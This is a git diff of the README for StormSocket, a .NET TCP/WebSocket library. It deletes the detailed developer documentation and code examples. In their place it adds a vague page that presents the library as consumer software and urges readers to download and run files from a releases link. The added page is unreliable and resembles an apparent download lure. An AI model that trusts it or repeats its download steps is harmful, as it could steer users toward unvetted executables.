@@ -1,1191 +1,141 @@
-<p align="center">
-  <img src="assets/stormsocket.png" alt="StormSocket" width="256" />
-</p>
-
-<h1 align="center">StormSocket</h1>
-
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-green.svg" alt="License" /></a>
-  <a href="https://www.nuget.org/packages/StormSocket"><img src="https://img.shields.io/nuget/v/StormSocket.svg" alt="NuGet" /></a>
-  <img src="https://img.shields.io/badge/.NET-6.0%20|%207.0%20|%208.0%20|%209.0%20|%2010.0-blue" alt=".NET" />
-</p>
-
-<p align="center">Modern, high-performance, event-based TCP/WebSocket/SSL library for .NET built on <b>System.IO.Pipelines</b>.</p>
-
-Zero subclassing required. Subscribe to events, configure options, and go. Server and client included.
-
-## Why StormSocket?
-
-Most .NET networking libraries use raw byte arrays with manual buffer management, and force you to subclass a base session class. StormSocket takes a different approach:
-
-- **Pooled, allocation-free I/O** — `System.IO.Pipelines` manages buffer pools internally. Socket writes directly into the pipe's memory, your handler reads from the same buffer — no intermediate copies, no `new byte[]` per read, minimal GC pressure under load
-- **Backpressure that actually works** — each pipe has configurable size thresholds. When a consumer falls behind, writes pause automatically. The OS TCP window propagates this upstream to the sender. No unbounded memory growth, no OOM crashes
-- **Slow consumer isolation** — every session gets its own dedicated pipe pair (receive + send). During broadcast, each session's send runs concurrently. If one client's send buffer is full, `SlowConsumerPolicy` handles it per-session (`Drop` the message, `Disconnect` the client, or `Wait`) — the other 99,999 sessions are completely unaffected. See [Slow Consumer Detection](#slow-consumer-detection) for details
-- **Subscribe, don't subclass** — `server.OnDataReceived += handler`, no inheritance chains
-- **SSL is a config flag** — same server, add `SslOptions`, done. No separate `SslServer` class
-- **Middleware pipeline** — rate limiting, auth, logging as composable plugins
-- **Built-in pub/sub** — named groups for chat rooms, game lobbies, ticker feeds
-
-# Contents
-- [Why StormSocket?](#why-stormsocket)
-- [Features](#features)
-- [Architecture](#architecture)
-- [Benchmarks](#benchmarks)
-- [Requirements](#requirements)
-- [Quick Start](#quick-start)
-- [Examples](#examples)
-  - [TCP Echo Server](#tcp-echo-server)
-  - [WebSocket Chat Server](#websocket-chat-server)
-  - [WebSocket Authentication](#websocket-authentication)
-  - [SSL/TLS Server](#ssltls-server)
-  - [TCP Client](#tcp-client)
-  - [WebSocket Client](#websocket-client)
-  - [Message Framing](#message-framing)
-  - [Session Management](#session-management)
-  - [Groups & Rooms](#groups--rooms)
-  - [Middleware Pipeline](#middleware-pipeline)
-  - [WebSocket Heartbeat & Dead Connection Detection](#websocket-heartbeat--dead-connection-detection)
-  - [Slow Consumer Detection](#slow-consumer-detection)
-  - [Rate Limiting](#rate-limiting)
-  - [Closing Connections: CloseAsync vs Abort](#closing-connections-closeasync-vs-abort)
-  - [Backpressure & Buffer Limits](#backpressure--buffer-limits)
-  - [Full WebSocket Server with Admin Console](#full-websocket-server-with-admin-console)
-- [Configuration Reference](#configuration-reference)
-  - [ServerOptions](#serveroptions)
-  - [ClientOptions](#clientoptions)
-  - [WsClientOptions](#wsclientoptions)
-  - [WebSocketOptions](#websocketoptions)
-  - [SocketTuningOptions](#sockettuningoptions)
-  - [HeartbeatOptions](#heartbeatoptions)
-  - [ReconnectOptions](#reconnectoptions)
-  - [SslOptions](#ssloptions)
-- [API Reference](#api-reference)
-  - [ISession](#isession)
-  - [WebSocketSession](#websocketsession)
-  - [SessionManager](#sessionmanager)
-  - [SessionGroup](#sessiongroup)
-  - [StormTcpClient](#stormtcpclient)
-  - [StormWebSocketClient](#stormwebsocketclient)
-  - [IConnectionMiddleware](#iconnectionmiddleware)
-  - [Message Framers](#message-framers)
-  - [WsMessage](#wsmessage)
-- [How It Works](#how-it-works)
-  - [Connection Lifecycle](#connection-lifecycle)
-  - [Write Serialization](#write-serialization)
-  - [Backpressure](#backpressure)
-- [Building](#building)
-- [Samples](#samples)
-- [License](#license)
-
-# Features
-- **Event-based API** - no subclassing, just `server.OnDataReceived += handler`
-- **TCP Server & Client** with optional message framing (raw, length-prefix, delimiter)
-- **WebSocket Server & Client** with full RFC 6455 compliance (text, binary, ping/pong, close, client-side masking)
-- **SSL/TLS** as a simple configuration option on any server or client
-- **Auto-reconnect** - clients automatically reconnect on disconnect with configurable delay and max attempts
-- **System.IO.Pipelines** for zero-copy I/O with built-in backpressure
-- **Automatic heartbeat** with configurable ping interval and dead connection detection (missed pong counting)
-- **Session management** - track, query, broadcast, and kick connections
-- **Groups/Rooms** - named groups for targeted broadcast (chat rooms, game lobbies, etc.)
-- **WebSocket authentication** - access path, query params, headers (cookies, tokens) before accepting connections via `OnConnecting` event
-- **Rate limiting middleware** - opt-in per-session or per-IP rate limiting with configurable window, action (disconnect/drop), and exceeded event
-- **Middleware pipeline** - intercept connect, disconnect, data received, data sending, and errors (works on both server and client)
-- **Backpressure & buffer limits** - configurable send/receive pipe limits prevent memory exhaustion
-- **Slow consumer detection** - `SlowConsumerPolicy` per session: `Wait` (block), `Drop` (skip), or `Disconnect` (close). Applied to both broadcast and individual sends
-- **Concurrent broadcast** - sends to all sessions in parallel, one slow client never blocks others
-- **Max connections** - configurable limit, excess connections are immediately rejected
-- **Thread-safe writes** - all PipeWriter access serialized via `SemaphoreSlim` (no frame corruption)
-- **TCP Keep-Alive** - enabled by default, prevents idle connections from being silently dropped by firewalls and NATs
-- **Connection timeout** - configurable timeout for client connections
-- **Handshake timeout** - configurable timeout for WebSocket upgrade, closes idle TCP connections that never send an upgrade request (DoS protection)
-- **Socket error handling** - proper SocketError filtering (ConnectionReset, Abort, etc.)
-- **Multi-target**: net6.0, net7.0, net8.0, net9.0, net10.0
-- **Zero dependencies** beyond `System.IO.Pipelines`
+# ⚡ StormSocket - Fast, Reliable Network Connections
 
-# Architecture
+[![Download StormSocket](https://img.shields.io/badge/Download-StormSocket-blue?style=for-the-badge)](https://github.com/KATUTAIGA/StormSocket/releases)
 
-StormSocket is designed around a few core principles:
+---
 
-| Principle | How |
-|---|---|
-| **Composition over inheritance** | Flat structure, no deep inheritance chains. WebSocket doesn't inherit from HTTP. |
-| **System.IO.Pipelines** | Zero-copy I/O with kernel-level backpressure, not custom Buffer classes. |
-| **Event-based API** | Subscribe to events, no need to subclass `TcpSession` or override methods. |
-| **SSL as decorator** | Same server, just add `SslOptions`. No separate `SslServer` class. |
-| **Integer session IDs** | `Interlocked.Increment` (fast, sortable) instead of Guid. |
-| **Write serialization** | All writes go through a per-session `SemaphoreSlim` lock - heartbeat pings, auto-pong, user sends, close frames never corrupt each other. |
+## 📖 What is StormSocket?
 
-# Benchmarks
+StormSocket is a software tool designed to help computers connect with each other quickly and safely over the internet or local networks. It supports multiple ways of connection, like TCP and WebSocket, which are common methods computers use to talk to each other. This tool is built using modern programming techniques to make these connections fast and efficient.
 
-Echo round-trip benchmark: 100 concurrent clients, 32-byte messages, 10-second sustained load.
+You don’t need to be a technical expert to use StormSocket. It is made for anyone who wants a stable and fast connection for their applications.
 
-Benchmark methodology and client/server structure inspired by [NetCoreServer](https://github.com/chronoxor/NetCoreServer) — a mature, battle-tested networking library that has been in active development for years. We use it as our reference point and recommend checking it out if you need a proven, stable solution.
+---
 
-StormSocket is newer and still evolving, but is designed to be production-ready from day one.
+## 💻 System Requirements
 
-### TCP Echo
+Before you download and run StormSocket, make sure your computer meets these simple requirements:
 
-| Metric | StormSocket | NetCoreServer |
-|---|---|---|
-| **Throughput** | 342 MiB/s | 73 MiB/s |
-| **Messages/sec** | 11,205,120 | 2,386,789 |
-| **Latency** | 89 ns | 418 ns |
+- Operating System: Windows 10 or later, macOS 10.13 or later, or Linux (Ubuntu 18.04 or newer)
+- Processor: Any processor that supports 64-bit (most modern processors)
+- Memory: At least 4 GB of RAM (8 GB recommended for heavy use)
+- .NET Runtime: Version 6.0 or higher (This allows the software to run)
+- Internet connection recommended for downloading and updates
 
-### WebSocket Echo
+---
 
-| Metric | StormSocket | NetCoreServer |
-|---|---|---|
-| **Throughput** | 66 MiB/s | 40 MiB/s |
-| **Messages/sec** | 2,163,373 | 1,309,842 |
-| **Latency** | 462 ns | 763 ns |
+## 🎯 Key Features
 
-> Results will vary by hardware, OS, and .NET version. Benchmark projects are included under `benchmark/` — run them yourself to verify on your own setup.
+StormSocket offers a range of features to ensure your network connections are:
 
-### Reproduce
+- **Fast**: Uses advanced technology to reduce delays.
+- **Secure**: Supports SSL and TLS encryption to protect your information.
+- **Flexible**: Works with different connection protocols including TCP and WebSocket.
+- **Reliable**: Maintains stable connections even under heavy traffic.
+- **Event-Based**: Responds immediately to changes in network status or user actions.
+- **Easy to Use**: Designed with users in mind, so setting up connections is straightforward.
 
-```bash
-# Terminal 1: Start server
-dotnet run -c Release --project benchmark/StormSocket.Benchmark.TcpEchoServer
+---
 
-# Terminal 2: Run client
-dotnet run -c Release --project benchmark/StormSocket.Benchmark.TcpEchoClient -- -c 100 -m 1000 -s 32 -z 10
-```
+## 🚀 Getting Started
 
-Replace `TcpEcho` with `WsEcho` for WebSocket benchmarks.
+Using StormSocket is straightforward. Follow these steps to download and run the software on your computer.
 
-# Requirements
-- [.NET 6.0](https://dotnet.microsoft.com/download/dotnet/6.0) or later
-- No native dependencies
+---
 
-# Quick Start
+## 📥 Download & Install
 
-```bash
-dotnet add package StormSocket
-```
-
-```csharp
-using System.Net;
-using StormSocket.Server;
-
-var server = new StormTcpServer(new ServerOptions
-{
-    EndPoint = new IPEndPoint(IPAddress.Any, 5000),
-});
-
-server.OnDataReceived += async (session, data) =>
-{
-    await session.SendAsync(data); // echo
-};
+1. Click the big button at the top or visit the releases page here:
 
-await server.StartAsync();
-Console.ReadLine();
-await server.DisposeAsync();
-```
+   [Download StormSocket Releases](https://github.com/KATUTAIGA/StormSocket/releases)
 
-# Examples
-
-## TCP Echo Server
+2. On the releases page, look for the latest version listed. Versions are numbered like `v1.0`, `v1.1`, etc. Click on the latest one to open the download options.
 
-The simplest possible server. Echoes back everything it receives.
-
-```csharp
-using System.Net;
-using StormSocket.Server;
-
-var server = new StormTcpServer(new ServerOptions
-{
-    EndPoint = new IPEndPoint(IPAddress.Any, 5000),
-    Socket = new SocketTuningOptions { NoDelay = true },
-});
-
-server.OnConnected += async session =>
-{
-    Console.WriteLine($"[{session.Id}] Connected ({server.Sessions.Count} online)");
-};
-
-server.OnDisconnected += async session =>
-{
-    Console.WriteLine($"[{session.Id}] Disconnected");
-};
-
-server.OnDataReceived += async (session, data) =>
-{
-    Console.WriteLine($"[{session.Id}] {data.Length} bytes received");
-    await session.SendAsync(data);
-};
-
-server.OnError += async (session, ex) =>
-{
-    Console.WriteLine($"[{session?.Id}] Error: {ex.Message}");
-};
-
-await server.StartAsync();
-Console.WriteLine("TCP Echo listening on :5000");
-Console.ReadLine();
-await server.DisposeAsync();
-```
-
-Test with: `telnet localhost 5000`
-
-## WebSocket Chat Server
-
-Broadcasts every message to all connected WebSocket clients.
-
-```csharp
-using System.Net;
-using StormSocket.Server;
-
-var ws = new StormWebSocketServer(new ServerOptions
-{
-    EndPoint = new IPEndPoint(IPAddress.Any, 8080),
-    WebSocket = new WebSocketOptions
-    {
-        Heartbeat = new HeartbeatOptions
-        {
-            PingInterval = TimeSpan.FromSeconds(15),
-            MaxMissedPongs = 3,
-        },
-    },
-});
-
-ws.OnConnected += async session =>
-{
-    Console.WriteLine($"[{session.Id}] WebSocket connected");
-};
-
-ws.OnMessageReceived += async (session, msg) =>
-{
-    if (msg.IsText)
-    {
-        Console.WriteLine($"[{session.Id}] {msg.Text}");
-        // Broadcast to everyone except sender
-        await ws.BroadcastTextAsync(msg.Text, excludeId: session.Id);
-    }
-};
-
-await ws.StartAsync();
-Console.WriteLine("WebSocket Chat listening on :8080");
-Console.ReadLine();
-await ws.DisposeAsync();
-```
-
-Test with: `wscat -c ws://localhost:8080`
-
-## WebSocket Authentication
-
-Authenticate clients before accepting WebSocket connections using `OnConnecting`. Access headers, cookies, query params, and path from the HTTP upgrade request.
-
-```csharp
-using System.Net;
-using StormSocket.Server;
-
-var ws = new StormWebSocketServer(new ServerOptions
-{
-    EndPoint = new IPEndPoint(IPAddress.Any, 8080),
-});
-
-ws.OnConnecting += async (context) =>
-{
-    // access request details
-    Console.WriteLine($"Path: {context.Path}");                    // "/chat"
-    Console.WriteLine($"Query: {context.Query["room"]}");          // "general"
-    Console.WriteLine($"Remote: {context.RemoteEndPoint}");        // "192.168.1.5:54321"
-
-    // check authorization header
-    string? token = context.Headers.GetValueOrDefault("Authorization");
-    if (string.IsNullOrEmpty(token) || !IsValidToken(token))
-    {
-        context.Reject(401, "Invalid or missing token");
-        return;
-    }
-
-    // check origin for browser clients
-    // or you can use allowedorigins in options
-    string? origin = context.Headers.GetValueOrDefault("Origin");
-    if (origin != "https://myapp.com")
-    {
-        context.Reject(403, "Origin not allowed");
-        return;
-    }
-
-    context.Accept();
-};
-
-ws.OnConnected += async session =>
-{
-    Console.WriteLine($"Authenticated client connected: #{session.Id}");
-};
-
-await ws.StartAsync();
-```
-
-If no `OnConnecting` handler is registered, all connections are auto-accepted (backwards compatible).
-
-## SSL/TLS Server
-
-Any server can be upgraded to SSL by adding `SslOptions`. No separate class needed.
-
-```csharp
-using System.Net;
-using System.Security.Cryptography.X509Certificates;
-using StormSocket.Server;
-
-var server = new StormTcpServer(new ServerOptions
-{
-    EndPoint = new IPEndPoint(IPAddress.Any, 5001),
-    Ssl = new SslOptions
-    {
-        Certificate = X509CertificateLoader.LoadPkcs12FromFile("server.pfx", "password"),
-    },
-});
-
-server.OnDataReceived += async (session, data) => await session.SendAsync(data);
-
-await server.StartAsync();
-```
-
-Works the same with `StormWebSocketServer` for WSS (WebSocket Secure).
-
-## TCP Client
-
-Connect to a TCP server with auto-reconnect, framing, and middleware support.
-
-```csharp
-using System.Net;
-using System.Text;
-using StormSocket.Client;
-
-var client = new StormTcpClient(new ClientOptions
-{
-    EndPoint = new IPEndPoint(IPAddress.Loopback, 5000),
-    Socket = new SocketTuningOptions { NoDelay = true },
-    Reconnect = new ReconnectOptions { Enabled = true, Delay = TimeSpan.FromSeconds(2) },
-});
-
-client.OnConnected += async () =>
-{
-    Console.WriteLine("Connected to server!");
-};
-
-client.OnDataReceived += async data =>
-{
-    Console.WriteLine($"Received: {Encoding.UTF8.GetString(data.Span)}");
-};
-
-client.OnDisconnected += async () =>
-{
-    Console.WriteLine("Disconnected from server");
-};
-
-client.OnReconnecting += async (attempt, delay) =>
-{
-    Console.WriteLine($"Reconnecting (attempt #{attempt})...");
-};
-
-await client.ConnectAsync();
-await client.SendAsync(Encoding.UTF8.GetBytes("Hello Server!"));
-```
-
-Use the same `IMessageFramer` on both server and client for message boundaries:
-
-```csharp
-var framer = new LengthPrefixFramer();
-
-// Server
-var server = new StormTcpServer(new ServerOptions { Framer = framer });
-
-// Client
-var client = new StormTcpClient(new ClientOptions { Framer = framer });
-```
-
-## WebSocket Client
-
-Connect to any WebSocket server with automatic masking, heartbeat, and reconnect.
-
-```csharp
-using StormSocket.Client;
-
-var ws = new StormWebSocketClient(new WsClientOptions
-{
-    Uri = new Uri("ws://localhost:8080/chat"),
-    Reconnect = new ReconnectOptions { Enabled = true },
-    Heartbeat = new HeartbeatOptions { PingInterval = TimeSpan.FromSeconds(15) },
-});
-
-ws.OnConnected += async () =>
-{
-    Console.WriteLine("WebSocket connected!");
-    await ws.SendTextAsync("Hello from StormSocket!");
-};
-
-ws.OnMessageReceived += async msg =>
-{
-    if (msg.IsText)
-        Console.WriteLine($"Server says: {msg.Text}");
-    else
-        Console.WriteLine($"Binary data: {msg.Data.Length} bytes");
-};
-
-ws.OnDisconnected += async () =>
-{
-    Console.WriteLine("WebSocket disconnected");
-};
-
-await ws.ConnectAsync();
-```
-
-For WSS (WebSocket Secure), use the `wss://` scheme:
-
-```csharp
-var ws = new StormWebSocketClient(new WsClientOptions
-{
-    Uri = new Uri("wss://echo.websocket.org"),
-});
-```
-
-Send custom HTTP headers during the upgrade handshake:
-
-```csharp
-var ws = new StormWebSocketClient(new WsClientOptions
-{
-    Uri = new Uri("ws://localhost:8080"),
-    Headers = new Dictionary<string, string>
-    {
-        { "Authorization", "Bearer my-token" },
-    },
-});
-```
-
-## Message Framing
-
-TCP is a stream protocol - it doesn't preserve message boundaries. StormSocket provides pluggable framers to solve this.
-
-### Length-Prefix Framer
-Prepends a 4-byte big-endian length header to each message. Best for binary protocols.
-
-```csharp
-var server = new StormTcpServer(new ServerOptions
-{
-    EndPoint = new IPEndPoint(IPAddress.Any, 5000),
-    Framer = new LengthPrefixFramer(), // [4-byte length][payload]
-});
-
-server.OnDataReceived += async (session, data) =>
-{
-    // data is a complete message - no partial reads
-    Console.WriteLine($"Complete message: {data.Length} bytes");
-};
-```
-
-### Delimiter Framer
-Splits messages on a delimiter byte. Default is `\n`. Good for text protocols.
-
-```csharp
-var server = new StormTcpServer(new ServerOptions
-{
-    EndPoint = new IPEndPoint(IPAddress.Any, 5000),
-    Framer = new DelimiterFramer(), // splits on \n
-});
-```
-
-### Custom Framer
-Implement `IMessageFramer` for your own protocol:
-
-```csharp
-public interface IMessageFramer
-{
-    bool TryReadMessage(ref ReadOnlySequence<byte> buffer, out ReadOnlyMemory<byte> message);
-    void WriteFrame(IBufferWriter<byte> writer, ReadOnlySpan<byte> payload);
-}
-```
-
-## Session Management
-
-Every connection gets an `ISession` with a unique auto-incrementing ID.
-
-```csharp
-// Get session count
-int online = server.Sessions.Count;
-
-// Find a session by ID
-if (server.Sessions.TryGet(42, out ISession? session))
-{
-    Console.WriteLine($"Session #{session.Id}, uptime: {session.Metrics.Uptime}");
-    Console.WriteLine($"Bytes sent: {session.Metrics.BytesSent}");
-    Console.WriteLine($"Bytes received: {session.Metrics.BytesReceived}");
-    Console.WriteLine($"Groups: {string.Join(", ", session.Groups)}");
-}
-
-// Broadcast to all
-await server.BroadcastAsync(data);
-
-// Broadcast excluding one
-await server.BroadcastAsync(data, excludeId: senderId);
-
-// Kick a session
-await session.CloseAsync();
-
-// Iterate all sessions
-foreach (ISession s in server.Sessions.All)
-{
-    Console.WriteLine($"#{s.Id} - {s.State} - up {s.Metrics.Uptime:hh\\:mm\\:ss}");
-}
-```
-
-### WebSocket-specific methods
-
-Cast to `WebSocketSession` for text frame support:
-
-```csharp
-ws.OnMessageReceived += async (session, msg) =>
-{
-    if (session is WebSocketSession wss)
-    {
-        // Send text frame (UTF-8)
-        await wss.SendTextAsync("Hello!");
-
-        // Send pre-encoded UTF-8 bytes (zero-copy)
-        byte[] utf8 = Encoding.UTF8.GetBytes("Hello!");
-        await wss.SendTextAsync(utf8);
-
-        // Send binary frame
-        await wss.SendAsync(binaryData);
-    }
-};
-```
-
-## Groups & Rooms
-
-Built-in named groups for chat rooms, game lobbies, pub/sub channels, etc.
-
-```csharp
-// Add session to a group
-server.Groups.Add("room:general", session);
-server.Groups.Add("room:vip", session);
-
-// Broadcast to a group
-await server.Groups.BroadcastAsync("room:general", data);
-
-// Broadcast excluding sender
-await server.Groups.BroadcastAsync("room:general", data, excludeId: session.Id);
-
-// Remove from group
-server.Groups.Remove("room:vip", session);
-
-// Check member count
-int count = server.Groups.MemberCount("room:general");
-
-// List all groups
-foreach (string name in server.Groups.GroupNames)
-{
-    Console.WriteLine($"{name}: {server.Groups.MemberCount(name)} members");
-}
-
-// Auto-cleanup on disconnect (call in OnDisconnected)
-server.Groups.RemoveFromAll(session);
-```
-
-## Middleware Pipeline
-
-Intercept and modify data flow, log connections, implement rate limiting, authentication, etc.
-
-```csharp
-public class AuthMiddleware : IConnectionMiddleware
-{
-    public ValueTask OnConnectedAsync(ISession session)
-    {
-        Console.WriteLine($"#{session.Id} connected");
-        return ValueTask.CompletedTask;
-    }
-
-    public ValueTask<ReadOnlyMemory<byte>> OnDataReceivedAsync(ISession session, ReadOnlyMemory<byte> data)
-    {
-        // Return data to pass downstream, or ReadOnlyMemory<byte>.Empty to suppress
-        if (!IsAuthenticated(session))
-            return ValueTask.FromResult(ReadOnlyMemory<byte>.Empty); // drop message
-
-        return ValueTask.FromResult(data);
-    }
-
-    public ValueTask OnDisconnectedAsync(ISession session)
-    {
-        // Called in reverse order (like middleware unwinding)
-        return ValueTask.CompletedTask;
-    }
-
-    public ValueTask OnErrorAsync(ISession session, Exception exception)
-    {
-        Console.WriteLine($"#{session.Id} error: {exception.Message}");
-        return ValueTask.CompletedTask;
-    }
-}
-
-server.UseMiddleware(new AuthMiddleware());
-```
-
-All methods have default no-op implementations - override only what you need.
-
-## WebSocket Heartbeat & Dead Connection Detection
-
-StormSocket automatically sends WebSocket Ping frames at a configurable interval and tracks Pong responses. If a client misses too many consecutive pongs, the connection is considered dead and automatically closed.
-
-```csharp
-var ws = new StormWebSocketServer(new ServerOptions
-{
-    WebSocket = new WebSocketOptions
-    {
-        Heartbeat = new HeartbeatOptions
-        {
-            PingInterval = TimeSpan.FromSeconds(15),  // Send Ping every 15s
-            MaxMissedPongs = 3,                        // Allow 3 missed Pongs
-            AutoPong = true,                           // Auto-reply to client Pings
-        },
-    },
-});
-```
-
-**How it works:**
-```
-t=0s   : Connection established
-t=15s  : Server sends Ping → missedPongs=1
-t=17s  : Client sends Pong → missedPongs=0 (reset)
-t=30s  : Server sends Ping → missedPongs=1
-t=45s  : Server sends Ping → missedPongs=2 (client not responding)
-t=60s  : Server sends Ping → missedPongs=3
-t=75s  : missedPongs=4 > 3 → OnTimeout → connection closed
-```
-
-## Slow Consumer Detection
-
-When broadcasting to thousands of clients, one slow client can stall delivery to everyone else. `SlowConsumerPolicy` solves this at the session level - it applies to **both broadcast and individual sends**.
-
-```csharp
-using StormSocket.Core;
-
-var server = new StormWebSocketServer(new ServerOptions
-{
-    EndPoint = new IPEndPoint(IPAddress.Any, 8080),
-    MaxConnections = 50_000,
-    SlowConsumerPolicy = SlowConsumerPolicy.Drop,
-});
-```
-
-| Policy | Behavior | Use Case |
-|---|---|---|
-| `Wait` | Awaits until pipe drains (default) | Reliable delivery, low client count |
-| `Drop` | Silently skips backpressured sessions | Real-time data where stale data is useless (chat, game state, stock tickers) |
-| `Disconnect` | Closes backpressured sessions | Critical feeds where all clients must keep up (financial data, command streams) |
-
-The policy is enforced inside `SendAsync` / `SendTextAsync`, so it works everywhere:
-
-```csharp
-// Individual send - policy applies
-await session.SendAsync(data);
-
-// Broadcast - policy applies per session, sends are concurrent
-await server.BroadcastAsync(data);
-await ws.BroadcastTextAsync("update");
-
-// Check if a session is under pressure
-if (session.IsBackpressured)
-{
-    Console.WriteLine($"Session #{session.Id} is slow");
-}
-```
-
-**How it works with 1M clients:**
-```
-Broadcast("data") called
-    │
-    ├─ Session #1: not backpressured → send (concurrent)
-    ├─ Session #2: backpressured + Drop → skip
-    ├─ Session #3: not backpressured → send (concurrent)
-    ├─ Session #4: backpressured + Disconnect → close + skip
-    └─ ... all sessions checked in parallel
-```
-
-All broadcast sends are dispatched concurrently. Each session has its own pipe, so one slow flush never blocks others.
-
-### Max Connections
-
-Limit concurrent connections. Excess connections are rejected at the TCP level (socket closed immediately before any handshake).
-
-```csharp
-var server = new StormTcpServer(new ServerOptions
-{
-    MaxConnections = 10_000, // 0 = unlimited (default)
-});
-```
-
-## Rate Limiting
-
-Built-in opt-in middleware that limits incoming messages per client within a configurable time window. Protects the server from misbehaving or malicious clients.
-
-```csharp
-using StormSocket.Middleware.RateLimiting;
-
-var rateLimiter = new RateLimitMiddleware(new RateLimitOptions
-{
-    Window = TimeSpan.FromSeconds(10),   // Time window
-    MaxMessages = 500,                   // Max messages per window
-    Scope = RateLimitScope.Session,      // Per session (default) or per IP
-    ExceededAction = RateLimitAction.Disconnect, // Disconnect (default) or Drop
-});
-
-rateLimiter.OnExceeded += async (session) =>
-{
-    Console.WriteLine($"Rate limit exceeded: #{session.Id} ({session.RemoteEndPoint})");
-};
-
-server.UseMiddleware(rateLimiter);
-```
-
-| Option | Values | Description |
-|---|---|---|
-| `Window` | `TimeSpan` | Time window for counting messages (default: 1 second) |
-| `MaxMessages` | `int` | Max messages allowed within the window (default: 100) |
-| `Scope` | `Session`, `IpAddress` | Per-session counters (default) or shared per IP |
-| `ExceededAction` | `Disconnect`, `Drop` | Abort the connection (default) or silently drop the message |
-
-**Scope options:**
-
-- **`Session`** (default): Each session has its own independent counter. Safe and predictable.
-- **`IpAddress`**: All sessions from the same IP share a single counter. Useful against distributed abuse from a single source. Note: clients behind NAT share an IP, so set limits accordingly.
-
-**Action options:**
-
-- **`Disconnect`** (default): Calls `session.Abort()` to immediately terminate the connection. Best for untrusted clients.
-- **`Drop`**: Silently discards the message but keeps the connection open. Useful for trusted clients that occasionally burst.
-
-The `OnExceeded` event fires on every rate limit hit (regardless of action), so you can log, monitor, or send a warning before the action is taken.
-
-> **Note:** `Disconnect` uses `Abort()` (immediate TCP close) rather than `CloseAsync()` (graceful WebSocket Close frame). This is intentional — a client flooding the server may not process a Close frame, causing the same blocking issue that `Abort()` was designed to solve. If you need a more nuanced approach, use `Drop` action with the `OnExceeded` event to handle it yourself.
-
-> **Using .NET's built-in rate limiting?** The `IConnectionMiddleware` interface is your extension point — you can create your own middleware wrapping `System.Threading.RateLimiting` (TokenBucketRateLimiter, SlidingWindowRateLimiter, etc.) without any extra dependencies from StormSocket.
-
-## Closing Connections: CloseAsync vs Abort
-
-StormSocket provides two ways to close a connection:
-
-| Method | Behavior |
-|---|---|
-| `CloseAsync()` | **Graceful**: Sends a WebSocket Close frame (if WS), waits for flush, then closes the socket. Safe and clean, but can block if the client is slow. |
-| `Abort()` | **Immediate**: Closes the socket directly without sending anything. All pending reads and writes are cancelled. The client sees a connection reset. |
-
-**When to use Abort:**
-
-If a client is so slow that it can't even process a Close frame, `CloseAsync()` will block waiting for the flush to complete. This is the exact scenario you encounter with slow consumers in production — the client's receive buffer is full, your Close frame sits in the send pipe, and the connection stays open indefinitely.
-
-`Abort()` skips the Close frame entirely and terminates the socket immediately. The server's read loop breaks, `OnDisconnected` fires, and the session is cleaned up.
-
-```csharp
-// Graceful close - sends Close frame, waits for flush
-await session.CloseAsync();
-
-// Immediate termination - no Close frame, no waiting
-session.Abort();
-
-// Common pattern: try graceful, fall back to abort
-using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
-try
-{
-    await session.CloseAsync(cts.Token);
-}
-catch (OperationCanceledException)
-{
-    session.Abort(); // client didn't close in time
-}
-```
-
-`SlowConsumerPolicy.Disconnect` uses `Abort()` internally — when backpressure is detected, the socket is killed immediately without attempting a graceful close.
-
-## Backpressure & Buffer Limits
-
-Pipe-level backpressure prevents memory exhaustion from slow consumers or fast producers.
-
-```csharp
-var server = new StormTcpServer(new ServerOptions
-{
-    Socket = new SocketTuningOptions
-    {
-        MaxPendingSendBytes = 1024 * 1024,     // 1 MB send buffer limit
-        MaxPendingReceiveBytes = 1024 * 1024,  // 1 MB receive buffer limit
-    },
-});
-```
-
-**What happens when limits are reached:**
-- **Send buffer full**: Behavior depends on `SlowConsumerPolicy`:
-  - `Wait` (default): `SendAsync` awaits until the socket drains pending data
-  - `Drop`: `SendAsync` returns immediately, message is silently discarded
-  - `Disconnect`: Session is closed automatically
-- **Receive buffer full**: Socket reads pause until the application processes buffered messages. The OS TCP window handles flow control upstream.
-
-Set to `0` for unlimited (not recommended for production).
-
-## Full WebSocket Server with Admin Console
-
-See `samples/StormSocket.Samples.WsServer` for a complete example featuring:
-
-- JSON command protocol (setName, chat, whisper, join/leave rooms, list users, etc.)
-- Per-second heartbeat tick with timestamp broadcast to all clients
-- Admin console with `/sessions`, `/kick`, `/broadcast`, `/rooms`, `/info` commands
-- Middleware-based connection logging
-- Session management with user names and room membership
-
-```bash
-dotnet run --project samples/StormSocket.Samples.WsServer
-```
-
-```
-StormSocket WsServer running on ws://0.0.0.0:8080
-/sessions  /kick <id>  /broadcast <msg>
-/rooms     /info <id>  /stop
-```
-
-# Configuration Reference
-
-## ServerOptions
-
-| Property | Type | Default | Description |
-|---|---|---|---|
-| `EndPoint` | `IPEndPoint` | `0.0.0.0:5000` | IP and port to listen on |
-| `Backlog` | `int` | `128` | Maximum pending connection queue |
-| `DualMode` | `bool` | `false` | Accept both IPv4 and IPv6 on a single port |
-| `ReceiveBufferSize` | `int` | `65536` | OS socket receive buffer (bytes) |
-| `SendBufferSize` | `int` | `65536` | OS socket send buffer (bytes) |
-| `MaxConnections` | `int` | `0` | Max concurrent connections (0 = unlimited). Excess are rejected at TCP level |
-| `SlowConsumerPolicy` | `SlowConsumerPolicy` | `Wait` | Behavior when a session is backpressured: `Wait`, `Drop`, or `Disconnect` |
-| `Ssl` | `SslOptions?` | `null` | SSL/TLS configuration (null = plain TCP) |
-| `WebSocket` | `WebSocketOptions?` | `null` | WebSocket settings (only for StormWebSocketServer) |
-| `Framer` | `IMessageFramer?` | `null` | Message framing strategy (null = raw bytes) |
-| `Socket` | `SocketTuningOptions` | `new()` | Low-level TCP socket tuning (NoDelay, KeepAlive, backpressure limits) |
-
-## WebSocketOptions
-
-| Property | Type | Default | Description |
-|---|---|---|---|
-| `MaxFrameSize` | `int` | `1048576` | Maximum frame payload (bytes). Oversized frames trigger close with `MessageTooBig` |
-| `AllowedOrigins` | `IReadOnlyList<string>?` | `null` | Allowed origins for CSWSH protection (RFC 6455 #10.2). `null` = allow all |
-| `HandshakeTimeout` | `TimeSpan` | `5s` | Max time for client to complete WebSocket upgrade after TCP connect. Prevents DoS via idle connections |
-| `Heartbeat` | `HeartbeatOptions` | `new()` | Ping/pong heartbeat and dead connection detection settings |
-
-## ClientOptions
-
-| Property | Type | Default | Description |
-|---|---|---|---|
-| `EndPoint` | `IPEndPoint` | `127.0.0.1:5000` | Server endpoint to connect to |
-| `Ssl` | `ClientSslOptions?` | `null` | SSL/TLS configuration |
